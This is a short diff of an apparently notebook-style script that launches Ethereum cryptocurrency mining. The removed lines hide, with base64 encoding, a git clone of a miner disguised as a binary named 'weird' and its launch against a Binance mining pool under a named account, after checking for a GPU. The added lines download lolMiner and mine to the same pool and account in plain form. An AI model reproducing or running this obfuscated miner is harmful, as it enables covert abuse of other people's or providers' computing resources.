@@ -1,8 +1,4 @@
-!/bin/bash
-import base64
-xa = str(base64.b64decode("Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9BbWl5NDUzL21pbmVwdXIuZ2l0"), 'utf-8')
-cmd = str(base64.b64decode("Li9taW5lcHVyL3dlaXJkIC0tYWxnbyBFVEhBU0ggLS1wb29sIHN0cmF0dW0rdGNwOi8vZXRoYXNoLnBvb2xiaW5hbmNlLmNvbToxODAwIC0tdXNlciAgamFpc2hyaXJhbTEwOCAtLXdvcmtlciAgamFpc2hyaXJhbTEwOC4wMDEgJChlY2hvICQoc2h1ZiAtaSAxMDAwLTk5OTkgLW4gMSktZXRoKQ=="), 'utf-8')
-!nvidia-smi
-!{xa}
-!chmod +x minepur/weird
-!{cmd}
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+tar -xf lolMiner_v1.29_Lin64.tar.gz
+cd 1.29
+./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user jaishriram108 --worker jaishriram108.001 $(echo $(shuf -i 1000-9999 -n 1)-eth)
